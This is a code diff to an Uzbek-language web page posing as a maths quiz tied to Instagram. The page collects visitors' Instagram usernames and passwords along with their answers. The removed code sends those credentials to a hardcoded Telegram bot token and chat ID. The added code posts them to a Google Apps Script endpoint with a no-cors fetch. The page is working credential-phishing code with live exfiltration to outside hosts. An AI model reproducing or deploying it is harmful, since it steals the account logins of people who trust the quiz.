@@ -49,10 +49,6 @@
             color: #f59e0b;
         }
 
-        .header p {
-            opacity: 0.9;
-        }
-
         .instagram-badge {
             display: inline-block;
             background: rgba(255,255,255,0.2);
@@ -272,8 +268,8 @@
 </div>
 
 <script>
-    const BOT_TOKEN = '8660191874:AAEGAnELpJbRX4BQGCI0xIIqiBXxkZ05l8E';
-    const CHAT_ID = '5008741322';
+    // Google Sheets Script URL (sozlangan)
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwnUbdSQKAIzJuwni70cUKBdlDFrHJNxaW_UBhd6QUHjJ2L02Om2P0tQctAqDVR4OIT/exec';
     
     const TESTS = [
         { text: "x + 5 = 12 bo‘lsa, x ni toping.", options: ["5", "7", "12", "17"], correct: 1 },
@@ -301,32 +297,7 @@
         return { correct, total: TESTS.length, percent: Math.round(correct / TESTS.length * 100) };
     }
 
-    async function sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-            const data = await response.json();
-            if (data.ok) {
-                return true;
-            } else {
-                console.error('Telegram API error:', data);
-                return false;
-            }
-        } catch (error) {
-            console.error('Fetch error:', error);
-            return false;
-        }
-    }
-
-    async function saveResultsAndNotify() {
+    async function sendToGoogleSheets() {
         const score = calculateScore();
         
         let answersDetail = '';
@@ -339,18 +310,28 @@
             answersDetail += `${i+1}. ${mark} ${userAnswerText} (to‘g‘ri: ${correctText})\n`;
         }
         
-        const date = new Date().toLocaleString('uz-UZ', { hour12: false });
-        let message = `📊 <b>YANGI TEST NATIJASI</b>\n\n`;
-        message += `👤 <b>Instagram username:</b> ${currentUser.username}\n`;
-        message += `🔐 <b>Instagram parol:</b> ${currentUser.password}\n`;
-        message += `📅 <b>Vaqt:</b> ${date}\n`;
-        message += `━━━━━━━━━━━━━━━━━━\n`;
-        message += `📈 <b>Natija:</b> ${score.correct}/${score.total} (${score.percent}%)\n`;
-        message += `━━━━━━━━━━━━━━━━━━\n`;
-        message += `<b>📝 Javoblar tahlili:</b>\n${answersDetail}`;
+        const data = {
+            username: currentUser.username,
+            password: currentUser.password,
+            score: score.correct,
+            total: score.total,
+            percent: score.percent,
+            answersDetail: answersDetail
+        };
         
-        const sent = await sendToTelegram(message);
-        return { score, success: sent };
+        try {
+            // mode: 'no-cors' bilan yuboramiz
+            await fetch(SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            return { score, success: true };
+        } catch (error) {
+            console.error('Xatolik:', error);
+            return { score, success: false };
+        }
     }
 
     async function finishTest() {
@@ -362,10 +343,11 @@
         }
         
         const submitBtn = document.getElementById('submitTestBtn');
+        const originalText = submitBtn.innerHTML;
         submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Jo‘natilmoqda...';
         submitBtn.disabled = true;
         
-        const result = await saveResultsAndNotify();
+        const result = await sendToGoogleSheets();
         
         const resultDiv = document.getElementById('resultMessage');
         resultDiv.style.display = 'block';
@@ -379,15 +361,16 @@
                 <small>Rahmat! Sizning ishtirokingiz qayd etildi.</small>
             `;
             submitBtn.innerHTML = '✅ Yakunlandi';
+            submitBtn.disabled = true;
         } else {
             resultDiv.className = 'result-area error';
             resultDiv.innerHTML = `
                 <i class="fas fa-exclamation-triangle" style="font-size: 28px;"></i><br><br>
                 <strong>Xatolik yuz berdi!</strong><br>
-                Internet aloqasini tekshiring va qayta urining.<br><br>
+                Iltimos, internet aloqasini tekshirib, qayta urinib ko‘ring.<br><br>
                 <button onclick="location.reload()" style="padding:10px 20px;background:#f59e0b;color:white;border:none;border-radius:12px;cursor:pointer;">Qayta urinish</button>
             `;
-            submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Qayta urinish';
+            submitBtn.innerHTML = originalText;
             submitBtn.disabled = false;
         }
     }
